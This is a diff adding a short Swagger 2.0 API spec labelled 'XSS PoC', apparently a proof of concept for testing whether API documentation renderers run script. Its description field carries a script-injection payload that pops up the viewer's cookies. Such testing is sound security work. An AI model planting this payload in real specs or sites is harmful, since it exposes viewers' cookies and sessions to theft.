@@ -1,0 +1,18 @@
+swagger: "2.0"
+info:
+  version: "1.0.0"
+  title: "XSS PoC"
+  description: "<script>alert(document.cookie)</script>"
+host: "example.com"
+schemes:
+  - https
+paths:
+  /example:
+    get:
+      summary: "Example endpoint"
+      description: "This endpoint demonstrates XSS vulnerability."
+      responses:
+        200:
+          description: "Success"
+          schema:
+            type: "string"
